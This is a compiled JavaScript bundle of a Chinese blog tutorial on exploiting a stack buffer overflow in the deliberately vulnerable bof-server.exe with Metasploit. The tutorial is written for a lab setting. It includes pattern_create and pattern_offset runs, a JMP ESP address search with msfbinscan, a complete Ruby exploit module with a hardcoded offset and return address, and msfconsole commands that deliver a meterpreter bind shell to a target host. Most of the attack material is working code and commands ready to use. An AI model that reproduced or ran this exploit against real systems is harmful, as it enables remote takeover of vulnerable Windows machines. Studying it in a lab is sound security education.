(window.webpackJsonp=window.webpackJsonp||[]).push([[250],{620:function(s,e,a){"use strict";a.r(e);var t=a(6),n=Object(t.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"使用metasploit实现对缓冲区栈的溢出攻击"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit实现对缓冲区栈的溢出攻击"}},[s._v("#")]),s._v(" 使用Metasploit实现对缓冲区栈的溢出攻击")]),s._v(" "),e("p",[s._v("这里我们不说理论，只讲实战，以Metasploit溢出bof-server.exe为例。")]),s._v(" "),e("h3",{attrs:{id:"下载工具"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#下载工具"}},[s._v("#")]),s._v(" 下载工具")]),s._v(" "),e("p",[s._v("这里需要下载bof-server.exe和ImmunityDebugger")]),s._v(" "),e("p",[s._v("bof-server.exe 下载地址为：[http://redstack.net/blog/category/How%20To.html](http://redstack.net/blog/category/How To.html)")]),s._v(" "),e("p",[s._v("ImmunityDebugger下载地址为："),e("a",{attrs:{href:"http://www.immunityinc.com/products/debugger/",target:"_blank",rel:"noopener noreferrer"}},[s._v("http://www.immunityinc.com/products/debugger/ "),e("OutboundLink")],1)]),s._v(" "),e("p",[s._v("或者 https://download.csdn.net/download/l1028386804/10918212")]),s._v(" "),e("h3",{attrs:{id:"开启bof-server-exe监听端口"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#开启bof-server-exe监听端口"}},[s._v("#")]),s._v(" 开启bof-server.exe监听端口")]),s._v(" "),e("p",[s._v("这里，我们监听200端口，具体方法为：打开cmd命令行，切换到bof-server.exe所在的目录后执行如下命令：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("bof-server.exe 200\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("此时，sof-server便开始监听200端口了。")]),s._v(" "),e("h3",{attrs:{id:"生成字符序列"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#生成字符序列"}},[s._v("#")]),s._v(" 生成字符序列")]),s._v(" "),e("p",[s._v("我们使用Metasploit中的pattern_create.rb脚本生成字符序列。首先我们查看以下pattern_create.rb脚本的帮助信息，在Kali命令行输入如下信息：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h\nUsage: msf-pattern_create [options]\nExample: msf-pattern_create -l 50 -s ABC,def,123\nAd1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf\n\nOptions:\n    -l, --length <length>            The length of the pattern\n    -s, --sets <ABC,def,123>         Custom Pattern Sets\n    -h, --help                       Show this message\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br")])]),e("p",[s._v('可以看到我们只要在pattern_create.rb脚本的后面加上"-l 字符序列长度"就可以生成指定长度的字符序列。这里，我们生成一个长度为1000的字符序列。')]),s._v(" "),e("p",[s._v("输入命令如下：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("可以看到我们生成了一个1000的字符序列")]),s._v(" "),e("h3",{attrs:{id:"将生成的字符序列发送到bof-server-exe监听的端口"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#将生成的字符序列发送到bof-server-exe监听的端口"}},[s._v("#")]),s._v(" 将生成的字符序列发送到bof-server.exe监听的端口")]),s._v(" "),e("p",[s._v("接下来我们将这个字符序列发送到bof-server.exe监听的端口。")]),s._v(" "),e("p",[s._v("首先我们通过telnet连接上bof-server.exe。")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("root@binghe:~# telnet 192.168.109.141 200\nTrying 192.168.109.141...\nConnected to 192.168.109.141.\nEscape character is '^]'.\n\n> \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("p",[s._v("接下来我们发送字符序列，将第3步生成的字符序列复制到telnet终端，回车。")]),s._v(" "),e("h3",{attrs:{id:"查看bof-server-exe命令行"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#查看bof-server-exe命令行"}},[s._v("#")]),s._v(" 查看bof-server.exe命令行")]),s._v(" "),e("p",[s._v("接着，我们查看bof-server.exe命令行状态，可以看到如下图所示：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162121672.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("说明bof-server.exe程序发生了溢出。我们单击“请单击此处”查看详情，如下：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162138902.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("可以看到Offset的值为：72413372")]),s._v(" "),e("h3",{attrs:{id:"找出准确字节数量"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#找出准确字节数量"}},[s._v("#")]),s._v(" 找出准确字节数量")]),s._v(" "),e("p",[s._v("这里我们用到的工具是Metasploit下的pattern_offset.rb，首先我们先查看pattern_offset.rb脚本的帮助信息，输入如下命令：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h\nUsage: msf-pattern_offset [options]\nExample: msf-pattern_offset -q Aa3A\n[*] Exact match at offset 9\n\nOptions:\n    -q, --query Aa0A                 Query to Locate\n    -l, --length <length>            The length of the pattern\n    -s, --sets <ABC,def,123>         Custom Pattern Sets\n    -h, --help                       Show this message\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("p",[s._v("可以看到-q参数为要查询的地址，-l参数为要查询的字符序列的长度。")]),s._v(" "),e("p",[s._v("根据第5步我们得出地址为：72413372，前面我们生成的字符序列的长度为1000")]),s._v(" "),e("p",[s._v("所以，我们输入如下命令来得出准确字节的数量")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413372 -l 1000\n[*] Exact match at offset 520\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("可以看到得出的结果为520")]),s._v(" "),e("h3",{attrs:{id:"分析bof-server-exe运行时加载的dll文件"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#分析bof-server-exe运行时加载的dll文件"}},[s._v("#")]),s._v(" 分析bof-server.exe运行时加载的DLL文件")]),s._v(" "),e("p",[s._v("这里，我们通过工具ImmunityDebugger工具来分析bof-server.exe运行时加载的DLL文件，可以到http://www.immunityinc.com/products/debugger/ 或者 https://download.csdn.net/download/l1028386804/10918212 下载。")]),s._v(" "),e("p",[s._v("具体操作如下：")]),s._v(" "),e("p",[s._v("打开ImmunityDebugger->File->Attach，来显示目标机上运行的所有进程。")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162431740.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("打开之后，我们看到了目标机上的所有进程如下，同时，我们找到名称为bof-server.exe的进程，如下所示：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162512512.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("接下来，我们选中bof-server.exe进程，单击右下角的Attach按钮")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019011516252913.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("此时，显示的是bof-server.exe的一些运行信息，如下：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162600358.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("接下来我们选择View->Executable modules，如下图：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162625865.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("点击后的效果如下图所示：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115162648673.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("这里，就是bof-server.exe运行加载的所有DLL文件了。这里我们选择一个ws2_32.dll文件上传到Kali的/root目录下，通过Metasploit的msfbinscan查找JMP ESP指令的地址。")]),s._v(" "),e("h3",{attrs:{id:"查找jmp-esp指令的地址"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#查找jmp-esp指令的地址"}},[s._v("#")]),s._v(" 查找JMP ESP指令的地址")]),s._v(" "),e("p",[s._v("这里，我们用到的工具是Metasploit下的msfbinscan。首先我们要进入msf命令行，在Kali终端下输入如下命令：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("查看msfbinscan的帮助信息，如下：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msf > msfbinscan -h\n[*] exec: msfbinscan -h\n\nUsage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfbinscan [mode] <options> [targets]\n\nModes:\n    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions        [PE|ELF|MACHO]\n    -p, --poppopret                  Search for pop+pop+ret combinations            [PE|ELF|MACHO]\n    -r, --regex [regex]              Search for regex match                         [PE|ELF|MACHO]\n    -a, --analyze-address [address]  Display the code at the specified address      [PE|ELF]\n    -b, --analyze-offset [offset]    Display the code at the specified offset       [PE|ELF]\n    -f, --fingerprint                Attempt to identify the packer/compiler        [PE]\n    -i, --info                       Display detailed information about the image   [PE]\n    -R, --ripper [directory]         Rip all module resources to disk               [PE]\n        --context-map [directory]    Generate context-map files                     [PE]\n\nOptions:\n    -A, --after [bytes]              Number of bytes to show after match (-a/-b)    [PE|ELF|MACHO]\n    -B, --before [bytes]             Number of bytes to show before match (-a/-b)   [PE|ELF|MACHO]\n    -I, --image-base [address]       Specify an alternate ImageBase                 [PE|ELF|MACHO]\n    -D, --disasm                     Disassemble the bytes at this address          [PE|ELF]\n    -F, --filter-addresses [regex]   Filter addresses based on a regular expression [PE]\n    -h, --help                       Show this message\nmsf > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br")])]),e("p",[s._v("接下来我们输入如下命令来获取JMP ESP指令的地址：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msf > msfbinscan -j esp /root/ws2_32.dll\n[*] exec: msfbinscan -j esp /root/ws2_32.dll\n\n[/root/ws2_32.dll]\n0x71a22b53 push esp; ret\nmsf > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("p",[s._v("可以看到，我们得出的JMP ESP指令的地址为：0x71a22b53")]),s._v(" "),e("h3",{attrs:{id:"编写攻击脚本bof-server-attack-rb"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#编写攻击脚本bof-server-attack-rb"}},[s._v("#")]),s._v(" 编写攻击脚本bof_server_attack.rb")]),s._v(" "),e("p",[s._v("接下来，我们就要编写攻击脚本bof_server_attack.rb了，这里不多说了，直接上代码：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("##\n# Author 冰河\n# Date 2019-01-15\n# Description 缓冲区溢出sof-server从而拿下目标服务器Meterpreter Shell\n##\n\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Tcp\n  \n  def initialize(info = {})\n  super(update_info(info,\n    'Name' => 'Stack Based Buffer Overflow Example',\n    'Description' => %q{\n      Stack Based Overflow Example Application Exploitation Module\n    },\n    'Platform' => 'WIndows',\n    'Author' => \n      [\n        'binghe'\n      ],\n      \n     'Payload' =>\n      {\n        'space' => 1000,\n        'BadChars' => \"\\x00\\xff\"\n      },\n     'Targets' =>\n      [\n        ['Windows XP SP3', {'Ret' => 0x71a22b53, 'Offset' => 520}]\n      ],\n     'DisclosureDate' => '2019-01-15'\n  ))\n  \n  register_options(\n  [\n    Opt::RPORT(200)\n  ],self.class)\n  end\n  \n  def exploit\n    connect\n    buf = make_nops(target['Offset'])\n    buf = buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded\n    sock.put(buf)\n    handler\n    disconnect\n   end\nend\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br")])]),e("p",[e("strong",[s._v("要注意的是：")])]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("'Targets' =>\n  [\n    ['Windows XP SP3', {'Ret' => 0x71a22b53, 'Offset' => 520}]\n  ],\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[s._v("中的"),e("strong",[s._v("Ret的值要和第8步中我们找到的JMP ESP指令的地址一致， Offset的值要和第6步中找出的准确字节数一致。")])]),s._v(" "),e("h3",{attrs:{id:"上传bof-server-attack-rb脚本"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#上传bof-server-attack-rb脚本"}},[s._v("#")]),s._v(" 上传bof_server_attack.rb脚本")]),s._v(" "),e("p",[s._v("将bof_server_attack.rb脚本上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit/目录下。")]),s._v(" "),e("h3",{attrs:{id:"运行攻击脚本"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#运行攻击脚本"}},[s._v("#")]),s._v(" 运行攻击脚本")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\nuse exploit/windows/masteringmetasploit/bof_server_attack\nset payload windows/meterpreter/bind_tcp\nshow options\nset RHOST 192.168.109.141\nshow options\nexploit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("p",[s._v("此时我们拿到了目标服务器的Meterpreter Shell，如下图所示：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115163113304.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("此时，我们查看目标服务器的bof-server.exe终端，如下图所示：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115163127479.png",loading:"lazy"}})]),s._v(" "),e("h3",{attrs:{id:"可能出现的问题"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#可能出现的问题"}},[s._v("#")]),s._v(" 可能出现的问题")]),s._v(" "),e("p",[s._v("有时我们运行exploit进行渗透拿Meterpreter Shell的时候，会出现不成功的情况，具体如下图：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115163145761.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("此时，查看目标机的bof-server.exe命令行的缓冲区溢出并断开了监听。")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115163207581.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("此时，只需要在目标机上多运行几次bof-server.exe 200和在Kali上多运行几次exploit，直到成功拿到Meterpreter Shell。")]),s._v(" "),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=n.exports}}]);